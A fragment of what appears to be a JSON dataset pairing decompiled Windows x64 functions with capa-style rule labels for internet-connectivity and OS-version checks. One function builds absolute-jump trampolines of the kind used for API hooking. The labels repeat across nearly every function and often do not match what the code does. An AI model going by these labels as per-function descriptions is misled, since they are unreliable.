cVar4;\n        if (cVar4 == 'f') {\n            *(arg1 + 0xc0) = 0x218;\n        }\n        else if (cVar4 == 'g') {\n            *(arg1 + 0xc0) = 0x217;\n        }\n        else {\n            *(arg1 + 0xc0) = 0x221;\n            *(arg1 + 200) = 0x8f;\n            *(arg1 + 0xcc) = 8;\n        }\n    }\n    *(arg1 + 0xa8) = 0;\n    *(arg1 + 0x40) = *(arg1 + 0xb0);\n    puVar10 = arg1 + 0x23a;\n    iVar8 = arg1 + 0x48;\n    if (*(arg1 + 0x18) != '\\0') {\n        do {\n            fcn.00061b10(iVar8, 0x15df0, *puVar10);\n            uVar7 = uVar7 + 1;\n            iVar8 = iVar8 + 2;\n            puVar10 = puVar10 + 1;\n        } while (uVar7 < *(arg1 + 0x18));\n    }\n    *(arg1 + 0xb0) = *(arg1 + 0xb0) + *(arg1 + 0x18);\n    return;\n}\n",
        "token_count": 3795
    },
    "00050e40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00050e40(int64_t arg1)\n\n{\n    int32_t iVar1;\n    \n    if ((*(arg1 + 8) != *(arg1 + 9)) || (*(arg1 + 0x30) == '\\0')) {\n        *(arg1 + 0x48) = 0;\n        *(arg1 + 0x68) = 0;\n        iVar1 = fcn.00050824(arg1);\n        if (iVar1 != 0) {\n            if (*(arg1 + 0x38) != NULL) {\n                (**(arg1 + 0x38))(arg1);\n            }\n            return *(arg1 + 0x18);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 160
    },
    "000514b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000514b4(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = 0;\n    if (*(arg1 + 0xa8) == 0) {\n        **(arg1 + 0x10) = **(arg1 + 0x28);\n    }\n    else if ((*(arg1 + 0xa8) == 1) && (*(arg1 + 8) != 0)) {\n        do {\n            *(uVar1 + *(arg1 + 0x10)) = *(*(arg1 + 0x18) + *(arg1 + 0x28) + uVar1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *(arg1 + 8));\n        return;\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00051574": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00051574(int64_t arg1, uint64_t arg2, ulong arg3, uint32_t *arg4)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint32_t uVar3;\n    uchar auStack680 [192];\n    int32_t iStack488;\n    \n    if (*0x879c8 == 0) {\n        uVar2 = 0x21590001;\n    }\n    else if (arg1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (arg4 == NULL) {\n        uVar2 = 0x21590068;\n    }\n    else {\n        fcn.00050e08(auStack680);\n        fcn.0004f4b8(auStack680);\n        fcn.0004f4d8(auStack680, 0);\n        fcn.0004f2e8(auStack680, arg1);\n        uVar3 = 0;\n        *arg4 = 0;\n        if (arg2 != 0) {\n            while ((arg3 == 0 || (*arg4 < arg3))) {\n                iVar1 = fcn.00050e40(auStack680);\n                if ((iVar1 == 0) || ((*arg4 = *arg4 + 1,  iStack488 == 0x1be || (iStack488 == 0x1bf)))) break;\n                iVar1 = fcn.0004f4f0(auStack680);\n                uVar3 = uVar3 + iVar1;\n                if (arg2 <= uVar3) break;\n            }\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 380
    },
    "0005164c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong * fcn.0005164c(ulong *arg1)\n\n{\n    ulong *puVar1;\n    \n    puVar1 = *arg1;\n    if (*(arg1 + 0x15) == 0) {\n        puVar1 = *puVar1;\n    }\n    return puVar1;\n}\n",
        "token_count": 69
    },
    "0005165c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005165c(ulong arg1, ulong arg2, int64_t arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uchar auVar3 [16];\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int64_t arg1_00;\n    uint64_t arg1_01;\n    int64_t **ppiVar9;\n    int64_t **ppiVar10;\n    int32_t iVar11;\n    uchar (*pauVar12) [16];\n    uint64_t uVar13;\n    int64_t *piVar14;\n    uchar auStack120 [12];\n    uint uStack108;\n    ulong uStack104;\n    ulong auStack96 [4];\n    \n    uVar13 = arg2;\n    if (arg4 == 0) {\ncode_r0x00051684:\n        iVar8 = 0x21590068;\n    }\n    else {\n        if (arg1 == 0) {\n            if (*(arg4 + 0xb0) == 0) goto code_r0x00051684;\n            uVar13 = *(arg4 + 0x10);\n        }\n        else {\n            if (arg2 == 0) {\n                return 0x21590065;\n            }\n            if (arg3 == 0) {\n                return 0x21590067;\n            }\n        }\n        uVar5 = fcn.00049b64();\n        arg1_01 = uVar5 * 0x2c;\n        arg1_00 = fcn.0002fbf0(arg1_01);\n        if (arg1_00 == 0) {\n            iVar8 = 0x21590004;\n        }\n        else {\n            uVar5 = fcn.00049b64();\n            uVar6 = fcn.00049b64();\n            uVar7 = fcn.00049b64();\n            ppiVar10 = arg1_00 + (uVar7 + uVar6) * 10;\n            iVar8 = fcn.00049b64();\n            uVar4 = 0;\n            if (iVar8 != 0) {\n                do {\n                    arg1_01 = uVar4;\n                    iVar11 = arg1_01;\n                    iVar8 = fcn.00049b70(arg1_01, arg1_00 + arg1_01 * 10);\n                    if ((iVar8 != 0) ||\n                       (iVar8 = fcn.00049b80(arg1_01, arg1_00 + uVar5 * 10 + arg1_01 * 10),  iVar8 != 0))\n                    goto code_r0x0005188d;\n                    uVar7 = iVar11 + 1;\n                    uVar6 = fcn.00049b64();\n                    uVar4 = uVar7;\n                } while (uVar7 < uVar6);\n            }\n            if (arg1 == 0) {\n                _auStack120 = *(arg4 + 0x68);\n            }\n            else {\n                pauVar12 = uVar13 * 0x10 + *(arg1_00 + 2);\n                auVar3 = *pauVar12;\n                arg1_01 = arg4;\n                fcn.00061a56(**pauVar12, arg4, 0, 0xd8);\n                *(arg4 + 0xb0) = arg3;\n                *(arg4 + 0xa8) = 0;\n                *(arg4 + 0x10) = uVar13;\n                uVar2 = *(*pauVar12 + 8);\n                stack0xffffffffffffff90 = SUB168(auVar3 >> 0x40, 0);\n                _auStack120 = CONCAT106(CONCAT82(stack0xffffffffffffff90, arg3 >> 0x10), \n                                        CONCAT24(0x8e00, CONCAT22(0x10, arg3)));\n                _auStack120 = _auStack120 & 0xffffffffffffffff;\n                *(arg4 + 0x68) = **pauVar12;\n                *(arg4 + 0x70) = uVar2;\n            }\n            uVar5 = 0;\n            iVar8 = fcn.00049b64();\n            if (iVar8 != 0) {\n                piVar14 = arg1_00 + 2;\n                ppiVar9 = ppiVar10;\n                do {\n                    iVar1 = *piVar14;\n                    *(ppiVar9 + 1) = _auStack120;\n                    uVar5 = uVar5 + 1;\n                    arg1_01 = iVar1 + uVar13 * 0x10;\n                    piVar14 = piVar14 + 10;\n                    *ppiVar9 = arg1_01;\n                    ppiVar9 = ppiVar9 + 3;\n                    uVar6 = fcn.00049b64();\n                } while (uVar5 < uVar6);\n            }\n            fcn.0001a764(CONCAT71(arg1_01 >> 8, 2), auStack96, &uStack104);\n            uVar5 = 0;\n            iVar8 = fcn.00049b64();\n            if (iVar8 != 0) {\n                do {\n                    uVar5 = uVar5 + 1;\n                    piVar14 = **ppiVar10;\n                    **ppiVar10 = ppiVar10[1];\n                    (*ppiVar10)[1] = ppiVar10[2];\n                    ppiVar10 = ppiVar10 + 3;\n                    uVar6 = fcn.00049b64(piVar14);\n                } while (uVar5 < uVar6);\n            }\n            fcn.0001a878(auStack96[0], uStack104);\n            iVar8 = 0;\ncode_r0x0005188d:\n            fcn.0002fc50(arg1_00);\n        }\n    }\n    return iVar8;\n}\n",
        "token_count": 1339
    },
    "000518b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000518b0(void)\n\n{\n    if (*0x879c8 == 0) {\n        return 0x21590064;\n    }\n    *0x87990 = 1;\n    return 0;\n}\n",
        "token_count": 52
    },
    "000518cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000518cc(void)\n\n{\n    if (*0x87990 != 0) {\n        fcn.0002fc50(*0x879a0);\n        *0x879a0 = 0;\n        *0x87990 = 0;\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00051934": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00051934(ulong arg1, uint64_t arg2, uint64_t *arg3, int64_t *arg4)\n\n{\n    ulong arg1_00;\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    int64_t *piVar5;\n    ulong *in_stack_00000028;\n    \n    *arg4 = 0;\n    arg2 = arg2 & 0xffffffff;\n    *in_stack_00000028 = 0;\n    if (arg1 == 1) {\n        piVar5 = fcn.00051404();\n        if (piVar5 == NULL) {\n            return 0xffffffff;\n        }\n    }\n    else {\n        if (arg1 != 2) {\n            return 0x21590065;\n        }\n        iVar2 = fcn.0005142c();\n        if (iVar2 == 0) {\n            return 0xffffffff;\n        }\n        uVar3 = fcn.00051020(arg4, in_stack_00000028);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        piVar5 = iVar2 + 0x20;\n        arg2 = arg2 - 0x1000;\n    }\n    if (arg2 < piVar5[2] || arg2 == piVar5[2]) {\n        if ((*0x87998 == 0) || (arg1 != 1)) {\n            *arg3 = *(*piVar5 + arg2 * 4);\n            iVar1 = fcn.0002f718();\n            if (iVar1 == 0x12) {\n                *arg3 = *arg3 & 0xfffffff0;\n            }\n            uVar4 = *arg3 + *piVar5;\n        }\n        else {\n            uVar4 = *(*0x87998 + arg2 * 8);\n        }\n        *arg3 = uVar4;\n        uVar3 = 0;\n    }\n    else {\n        iVar2 = *arg4;\n        arg1_00 = *in_stack_00000028;\n        uVar3 = 0x21590066;\n        if (iVar2 != 0) {\n            (**0x113a8)(arg1_00);\n            (*_fcn.000115b0)(iVar2);\n            fcn.0002fc50(arg1_00);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 538
    },
    "00051a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00051a40(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int64_t *arg1_00;\n    uchar *puVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t *apiStackX8 [4];\n    int64_t **in_stack_00000028;\n    uchar auStack712 [192];\n    int32_t iStack520;\n    int32_t iStack512;\n    char cStack508;\n    int32_t iStack504;\n    int32_t iStack496;\n    int32_t iStack492;\n    int32_t iStack480;\n    char cStack476;\n    uchar uStack472;\n    \n    uVar8 = 0;\n    if (arg1 == 0) {\n        return 0x21590065;\n    }\n    if (arg3 == 0) {\n        return 0x21590066;\n    }\n    if (in_stack_00000028 == NULL) {\n        return 0x2159006a;\n    }\n    arg1_00 = fcn.0002fbf0(0xd8);\n    if (arg1_00 == NULL) {\n        return 0x21590004;\n    }\n    apiStackX8[0] = arg1_00;\n    fcn.00061a56(arg1_00, 0, 0xd8);\n    *(arg1_00 + 0x1a) = 1;\n    *(arg1_00 + 0xac) = 0;\n    arg1_00[2] = arg1;\n    arg1_00[1] = 0;\n    arg1_00[6] = 0;\n    fcn.00050e08(auStack712);\n    fcn.0004f4b8(auStack712);\n    fcn.0004f4d8(auStack712, 0);\n    fcn.0004f2e8(auStack712, arg1);\n    uVar6 = uVar8;\n    while ((arg1_00[1] < arg3 && (iVar2 = fcn.00050e40(auStack712),  iVar2 != 0))) {\n        if ((iStack520 == 0x1be) || (iStack520 == 0x1bf)) {\n            return 0x2159000e;\n        }\n        uVar3 = fcn.0004f4f0(auStack712);\n        uVar6 = uVar6 + uVar3;\n        arg1_00[1] = arg1_00[1] + uVar3;\n    }\n    iVar2 = fcn.00051500(arg1_00, uVar6 + 0xe);\n    if (iVar2 == 0) {\n        fcn.0004f2e8(auStack712, arg1);\n        iVar7 = 0;\n        if (arg1_00[1] != 0) {\n            do {\n                iVar2 = fcn.00050e40(auStack712);\n                if (iVar2 == 0) break;\n                if (iStack520 == 0xde) {\n                    if ((iStack512 == 0x90) && (cStack508 == '\\b')) {\n                        uVar3 = fcn.0004f4f0(auStack712);\n                        iVar2 = fcn.00051500(arg1_00, (arg1_00[6] - uVar3) + 0xe);\n                        if (iVar2 == 0) {\n                            uVar3 = fcn.0004f4f0(auStack712);\n                            puVar5 = *arg1_00 + iVar7;\n                            *puVar5 = 0xff;\n                            puVar5[1] = 0x25;\n                            *(puVar5 + 2) = 0;\n                            *(puVar5 + 6) = iStack504 + arg1 + uVar3 + uVar8;\n                            goto code_r0x00051c40;\n                        }\n                        goto code_r0x00051ec4;\n                    }\ncode_r0x00051e0b:\n                    uVar4 = fcn.0004f4f0(auStack712);\n                    fcn.000619f6(*arg1_00 + iVar7, arg1 + uVar8, uVar4);\ncode_r0x00051e27:\n                    uVar3 = fcn.0004f4f0(auStack712);\n                    uVar8 = uVar8 + uVar3;\n                    uVar3 = fcn.0004f4f0(auStack712);\n                    iVar7 = iVar7 + uVar3;\n                }\n                else {\n                    if ((((((iStack520 == 0x232) || (iStack520 == 0xe5)) || (iStack520 == 0xe4)) ||\n                         ((iStack520 == 0xe2 || (iStack520 == 0x231)))) || (iStack520 == 0xe6)) &&\n                       ((iStack512 == 0x90 && (cStack508 == '\\b')))) {\n                        iVar2 = fcn.00051500(arg1_00, arg1_00[6] + 0xe);\n                        if (iVar2 == 0) {\n                            *(*arg1_00 + iVar7) = *(arg1 + uVar8);\n                            *(*arg1_00 + 1 + iVar7) = (*(arg1_00 + 6) - iVar7) + -0x10;\n                            uVar3 = fcn.0004f4f0(auStack712);\n                            puVar5 = *arg1_00 + -0xe + arg1_00[6];\n                            *puVar5 = 0xff;\n                            puVar5[1] = 0x25;\n                            *(puVar5 + 2) = 0;\n                            *(puVar5 + 6) = iStack504 + arg1 + uVar3 + uVar8;\n                            goto code_r0x00051e27;\n                        }\n                        goto code_r0x00051ec4;\n                    }\n                    if (((iStack520 != 0x31) || (((iStack512 != 0x8d || (iStack496 != 0x8b)) || (iStack492 != 0)))) ||\n                       (((cStack508 != ' ' || (iStack480 != 0x8f)) || (cStack476 != '\\b')))) goto code_r0x00051e0b;\n                    uVar3 = fcn.0004f4f0(auStack712);\n                    iVar2 = fcn.00051500(arg1_00, (arg1_00[6] - uVar3) + 0xe);\n                    if (iVar2 != 0) goto code_r0x00051ec4;\n                    *(*arg1_00 + iVar7) = 0x50;\n                    *(*arg1_00 + 1 + iVar7) = 0x48;\n                    *(*arg1_00 + 2 + iVar7) = 0xa1;\n                    uVar3 = fcn.0004f4f0(auStack712);\n                    *(*arg1_00 + 3 + iVar7) = iStack504 + arg1 + uVar3 + uVar8;\n                    *(*arg1_00 + 0xb + iVar7) = 0x3c;\n                    *(*arg1_00 + 0xc + iVar7) = uStack472;\n                    *(*arg1_00 + 0xd + iVar7) = 0x58;\n                    uVar3 = fcn.0004f4f0(auStack712);\n                    uVar8 = uVar8 + uVar3;\ncode_r0x00051c40:\n                    iVar7 = iVar7 + 0xe;\n                }\n            } while (uVar8 < arg1_00[1]);\n        }\n        iVar1 = arg1_00[1];\n        puVar5 = *arg1_00 + iVar7;\n        *puVar5 = 0xff;\n        puVar5[1] = 0x25;\n        *(puVar5 + 2) = 0;\n        *(puVar5 + 6) = iVar1 + arg1 + arg2;\n        if (arg4 != 0) {\n            uVar8 = arg1_00[1];\n            arg1_00[4] = uVar8;\n            if (uVar8 < 0x20) {\n                arg1_00[5] = arg1_00 + 0xd;\n            }\n            else {\n                iVar7 = fcn.0002fbf0(uVar8);\n                arg1_00[5] = iVar7;\n                if (iVar7 == 0) {\n                    arg1_00[4] = 0;\n                    iVar2 = 0x21590004;\n                    goto code_r0x00051ec4;\n                }\n            }\n            fcn.000619f6(arg1_00[5], arg1, arg1_00[4]);\n            *(arg1_00 + 3) = 0;\n        }\n        *in_stack_00000028 = arg1_00;\n        iVar2 = 0;\n    }\n    else {\ncode_r0x00051ec4:\n        fcn.00051454(apiStackX8);\n    }\n    return iVar2;\n}\n",
        "token_count": 2096
    },
    "00051f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00051f30(int64_t arg1, int64_t arg2, ulong *arg3, ulong noname_3, ulong noname_4, ulong noname_5, \n                     ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                     ulong noname_12, ulong noname_13, ulong noname_14, ulong noname_15, ulong noname_16, \n                     ulong noname_17, ulong noname_18, ulong noname_19, ulong arg_b0h, ulong arg_b8h, ulong arg_c0h, \n                     ulong arg_c8h)\n\n{\n    int32_t *piVar1;\n    ulong *arg4;\n    int64_t *piVar2;\n    ulong *arg1_00;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    ulong arg1_01;\n    int64_t *piVar7;\n    int64_t iVar8;\n    int64_t *piVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong var_58h;\n    ulong var_60h;\n    ulong *apuStack88 [3];\n    \n    uVar6 = 0;\n    uStackX32 = 0;\n    uStackX24 = 0;\n    if (arg3 == NULL) {\n        return 0x21590067;\n    }\n    *arg3 = 0;\n    if (arg1 == 0) {\n        return 0x21590065;\n    }\n    if (arg2 == 0) {\n        return 0x21590066;\n    }\n    if (*0x879c8 == 0) {\n        return 0x21590001;\n    }\n    apuStack88[0] = arg3;\n    uVar3 = fcn.0001a764(CONCAT71(arg1 >> 8, 2), &uStackX32, &uStackX24);\n    uVar11 = uVar3;\n    if (uVar3 != 0) goto code_r0x00052230;\n    iVar5 = 0x21590005;\n    if (*0x879c0 != 0) {\n        piVar7 = *0x879b8 + 8;\n        do {\n            if ((*piVar7 != 0) && (*(*piVar7 + 0x10) == arg1)) {\n                iVar8 = *(*0x879b8 + 8 + uVar6 * 0x10);\n                if (*(iVar8 + 0xb0) != arg2) {\n                    fcn.0001a878(uStackX32, uStackX24);\n                    return 0x21590064;\n                }\n                piVar1 = iVar8 + 0xd0;\n                *piVar1 = *piVar1 + 1;\n                *arg3 = *(*0x879b8 + 8 + uVar6 * 0x10);\n                iVar5 = 0;\n                break;\n            }\n            uVar3 = uVar6 + 1;\n            uVar6 = uVar3;\n            piVar7 = piVar7 + 2;\n        } while (uVar3 < *0x879c0);\n    }\n    fcn.0001a878(uStackX32, uStackX24);\n    if (iVar5 == 0) {\n        return 0;\n    }\n    if (*0x879c0 == 0xff) {\n        return 0x21590007;\n    }\n    uVar6 = fcn.00051a40(arg1, 0, 4, 1);\n    arg1_00 = apuStack88[0];\n    if (uVar6 != 0) {\n        return uVar6;\n    }\n    piVar7 = apuStack88[0] + 0x16;\n    arg4 = apuStack88[0] + 0x19;\n    apuStack88[0][0xb] = *apuStack88[0];\n    apuStack88[0][0xc] = apuStack88[0][6];\n    *piVar7 = arg2;\n    *(apuStack88[0] + 0x15) = 1;\n    apuStack88[0][0x18] = 4;\n    piVar2 = apuStack88[0] + 0x17;\n    *piVar2 = arg1;\n    uVar3 = *(apuStack88[0] + 0x18);\n    iVar8 = arg1;\n    uVar4 = fcn.0001a8b4(arg1, uVar3, 2, arg4);\n    *piVar2 = arg1;\n    arg1_00[0x18] = uVar3;\n    uVar11 = uVar4;\n    if (uVar4 != 0) goto code_r0x00052230;\n    uVar3 = fcn.0001a764(CONCAT71(iVar8 >> 8, 2), &uStackX32, &uStackX24);\n    uVar11 = uVar3;\n    if (uVar3 == 0) {\n        arg1_01 = fcn.0001a724();\n        uVar4 = *0x879c0;\n        uVar3 = 0;\n        if (*0x879c0 != 0) {\n            piVar9 = *0x879b8 + 8;\n            do {\n                if (*piVar9 == 0) break;\n                uVar3 = uVar3 + 1;\n                piVar9 = piVar9 + 2;\n            } while (uVar3 < uVar4);\n        }\n        puVar10 = arg1_00;\n        if (uVar3 < uVar4) {\ncode_r0x000521ad:\n            uVar4 = fcn.00051ee8(arg1_00);\n            uVar11 = uVar4;\n            if (uVar4 == 0) {\n                *(*0x879b8 + 8 + uVar3 * 0x10) = arg1_00;\n                *(*0x879b8 + uVar3 * 0x10) = *piVar7;\n                puVar10 = apuStack88[0];\n            }\n        }\n        else {\n            iVar5 = fcn.0003055c(0x879b8, uVar4 << 4, uVar4 + 1 << 4);\n            if (iVar5 != -1) {\n                uVar3 = *0x879c0;\n                *0x879c0 = *0x879c0 + 1;\n                goto code_r0x000521ad;\n            }\n            uVar11 = 0x21590004;\n            fcn.000514b4(arg1_00);\n        }\n        fcn.0001a734(arg1_01);\n        fcn.0001a878(uStackX32, uStackX24);\n        if (uVar11 == 0) {\n            fcn.0001a924(*piVar2, *arg4);\n            *piVar2 = 0;\n            arg1_00[0x18] = 0;\n            arg1_00[0x19] = 0;\n            *arg3 = puVar10;\n            return uVar11;\n        }\n    }\n    fcn.0001a924(*piVar2, *arg4);\ncode_r0x00052230:\n    fcn.00051454(apuStack88);\n    return uVar11;\n}\n",
        "token_count": 1706
    },
    "00052888": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00052888(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int64_t iStackX32;\n    ulong uStack24;\n    \n    uVar1 = fcn.00051934(arg1, arg2, arg3, &iStackX32);\n    if (uVar1 == 0) {\n        if (iStackX32 != 0) {\n            (**0x113a8)(uStack24);\n            (*_fcn.000115b0)(iStackX32);\n            fcn.0002fc50(uStack24);\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 151
    },
    "000528d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000528d4(void)\n\n{\n    if (*0x879c8 != 0) {\n        fcn.0002fc50(*0x879b8);\n        fcn.000524d0(0x87980);\n        fcn.0002fc50(*0x879a0);\n        fcn.0002fc50(*0x87998);\n        *0x879c8 = 0;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00052920": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00052920(ulong noname_0, ulong noname_1, int64_t arg3, ulong *arg4)\n\n{\n    ulong uVar1;\n    \n    if (arg4 == NULL) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        *arg4 = 0;\n        if (arg3 == 0) {\n            uVar1 = 0x21590067;\n        }\n        else if (*0x879c8 == 0) {\n            uVar1 = 0x21590001;\n        }\n        else if (*0x879c0 == -1) {\n            uVar1 = 0x21590007;\n        }\n        else {\n            uVar1 = fcn.0005276c(noname_0, noname_1, arg3, arg4);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 196
    },
    "00052970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00052970(ulong param_1, ulong param_2, ulong param_3, ulong param_4)\n\n{\n    ulong uVar1;\n    \n    if (*0x879c8 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.000527ec(param_1, param_2, param_3, param_4);\n    }\n    return uVar1;\n}\n",
        "token_count": 103
    },
    "00052990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00052990(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    ulong uVar1;\n    \n    if (*0x879c8 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.00052888(param_1, param_2, param_3);\n    }\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "000529b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000529b0(ulong noname_0, int64_t *arg2)\n\n{\n    ulong uVar1;\n    \n    if (*0x87990 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.00052590(noname_0, arg2);\n        if (uVar1 == 0) {\n            *(*arg2 + 0xa8) = 1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 115
    },
    "000529e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000529e8(ulong noname_0, int64_t *arg2)\n\n{\n    ulong uVar1;\n    \n    if (*0x87990 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.00052518(noname_0, arg2);\n        if (uVar1 == 0) {\n            *(*arg2 + 0xa8) = 1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 115
    },
    "00052a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00052a20(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    uint32_t auStackX16 [6];\n    int64_t in_stack_00000028;\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else if (arg4 == 0) {\n        uVar1 = 0x21590068;\n    }\n    else if (in_stack_00000028 == 0) {\n        uVar1 = 0x21590069;\n    }\n    else {\n        uVar1 = fcn.00050f04(arg2, arg3, auStackX16);\n        if (uVar1 == 0) {\n            uVar1 = fcn.0005276c(arg1, auStackX16[0], arg4, in_stack_00000028);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 245
    },
    "00052a94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
